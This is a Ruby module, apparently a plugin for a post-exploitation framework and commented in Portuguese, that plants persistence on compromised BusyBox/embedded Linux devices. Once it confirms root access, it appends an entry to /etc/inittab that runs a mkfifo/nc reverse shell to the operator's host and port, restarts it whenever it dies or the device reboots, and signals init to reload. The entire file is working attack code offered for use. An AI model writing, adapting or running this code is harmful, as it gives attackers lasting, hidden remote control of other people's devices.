module BusyboxInittabReverseShell
  def self.run(fm, sid, client,lhost,lport)
    session = fm.sessions[sid]
    return unless session

    begin
      uid = session.shell_command_token('id -u').to_i
      unless uid == 0
        client.print_status("Session #{sid} is not root. Skipping inittab modification.")
        return
      end
    rescue => e
      client.print_error("Failed to check UID: #{e}")
      return
    end

    inittab = '/etc/inittab'
    marker  = '# revshell_persist'

    client.print_good("Session #{sid} is root. Deploying reverse shell via inittab...")

    # Verificar se já foi injetado
    if session.shell_command_token("grep -q '#{marker}' #{inittab} 2>/dev/null && echo 'EXISTS'").include?('EXISTS')
      client.print_status("inittab reverse shell already deployed. Skipping.")
      return
    end

    # Payload seguro: não bloqueia TTY, roda em background via respawn
    # Usa 'setsid' se disponível, senão executa diretamente com redirecionamento
    payload_cmd = "rm -f /tmp/.b; mkfifo /tmp/.b; /bin/sh -i < /tmp/.b 2>&1 | nc #{lhost} #{lport} > /tmp/.b"

    # Entrada no inittab: 'rs' = ID curto, '12345' = runlevels (todos), 'respawn' = reinicia se morrer
    inittab_entry = "rs:12345:respawn:#{payload_cmd} #{marker}"

    begin
      content = session.shell_command_token("cat #{inittab} 2>/dev/null")
    rescue
      content = ""
    end

    # Adicionar nova linha
    new_content = content.strip + "\n#{inittab_entry}\n"

    write_cmd = <<~SHELL
      cat > '#{inittab}' << 'EOF'
      #{new_content}
      EOF
      # Notificar init para recarregar (nem sempre suportado, mas tentamos)
      kill -HUP 1 2>/dev/null || true
    SHELL

    begin
      session.shell_command(write_cmd)
      client.print_good("Reverse shell added to /etc/inittab! Will respawn on boot or if killed.")
      client.print_status("Note: Some embedded systems require a reboot for inittab changes to take full effect.")
    rescue => e
      client.print_error("Failed to modify /etc/inittab: #{e.message}")
    end
  end
end
